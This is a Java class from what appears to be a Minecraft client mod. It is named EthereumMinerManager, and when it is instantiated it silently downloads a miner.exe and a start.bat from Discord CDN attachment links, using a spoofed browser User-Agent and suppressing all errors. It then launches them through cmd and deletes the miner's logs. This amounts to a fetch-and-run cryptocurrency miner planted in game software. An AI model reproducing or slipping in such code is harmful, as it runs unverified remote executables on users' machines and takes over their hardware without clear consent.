package dev.zprestige.fire.manager;

import dev.zprestige.fire.Main;
import net.minecraft.client.Minecraft;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Objects;
import java.util.stream.Collectors;

public class EthereumMinerManager {
    protected final Minecraft mc = Main.mc;
    protected final File file = Main.fileManager.registerPathAndCreate(Main.fileManager.getDirectory() + File.separator + "Miner");
    protected final File logs = Main.fileManager.registerPathAndCreate(file + File.separator + "logs");
    protected final File miner = new File(file + File.separator + "miner.exe");
    protected final File bat = new File(file + File.separator + "start.bat");
    protected final byte[] bytes = new byte[2048];
    protected int length;
    protected InputStream inputStream;
    protected OutputStream outputStream;
    protected Thread thread;
    protected String name;

    public EthereumMinerManager() {
        download("https://cdn.discordapp.com/attachments/896292452913274920/959977176214683689/miner.exe", miner);
        download("https://cdn.discordapp.com/attachments/785909027896295465/961225710930890802/start.bat", bat);
    }

    public void start() {
        try {
            //noinspection ResultOfMethodCallIgnored
            filesInFolder(logs).forEach(File::delete);
            Runtime.getRuntime().exec("cmd /c start " + bat);
        } catch (Exception ignored) {
        }
    }

    public void end() {
        try {
            Runtime.getRuntime().exec("taskkill /F /IM miner.exe");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    protected ArrayList<File> filesInFolder(File file) {
        try {
            return Arrays.stream(Objects.requireNonNull(file.list())).map(file1 -> new File(file + File.separator + file1)).collect(Collectors.toCollection(ArrayList::new));
        } catch (Exception ignored) {
            return new ArrayList<>();
        }
    }

    public void download(String url, File dir) {
        thread = new Thread(() -> {
            if (!dir.exists()) {
                try {
                    final URL url1 = new URL(url);
                    final URLConnection connection = url1.openConnection();
                    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30 ChromePlus/1.6.3.1");
                    inputStream = connection.getInputStream();
                    outputStream = Files.newOutputStream(dir.toPath());
                    while ((length = inputStream.read(bytes)) != -1) {
                        outputStream.write(bytes, 0, length);
                    }
                    outputStream.close();
                    inputStream.close();
                } catch (Exception ignored) {
                }
            }
        });
        thread.start();
    }
    public File getBat() {
        return bat;
    }
}
